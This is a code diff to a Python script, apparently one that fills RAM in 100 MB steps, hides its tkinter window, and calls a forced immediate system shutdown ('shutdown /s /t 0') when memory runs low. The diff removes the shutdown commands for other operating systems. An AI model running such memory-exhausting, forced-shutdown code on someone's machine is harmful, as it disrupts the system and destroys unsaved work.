@@ -14,14 +14,6 @@ root.withdraw()
 def system_reboot_or_shutdown():
     if os_name == "Windows":
         os.system("shutdown /s /t 0")
-    elif os_name == "Linux":
-        os.system("sudo shutdown -P now || shutdown -P now || loginctl poweroff")
-    elif os_name in ("FreeBSD", "OpenBSD", "NetBSD", "DragonFly"):
-        os.system("sudo shutdown -p now || shutdown -p now")
-    elif os_name == "Android":
-        os.system("su -c reboot || reboot")
-    elif os_name == "Darwin":
-        os.system("sudo shutdown -h now")
     else:
         print(f"Unknown OS: {os_name}.")
         time.sleep(1)
@@ -61,9 +53,11 @@ def main():
         while True:
             mem = psutil.virtual_memory()
             available_bytes = mem.available
+            process = psutil.Process()                                  # Текущий процесс
+            
             added_mb = 100
             total_used_gb += added_mb / 1024
-            print(f"Added: +{added_mb}MB | Total allocated: {total_used_gb:.1f}GB | RAM used: {mem.percent:.0f}%", end='\r')
+            print(f"Added: +{added_mb}MB | Total allocated: {total_used_gb:.1f}GB | RAM used: {process.memory_info().rss/1024**3:.1f}GB", end='\r')
                 
             if available_bytes < RESERVED_GB * 1024**3:
                 print(f"\nTRIGGER! rand_num={rand_num}")
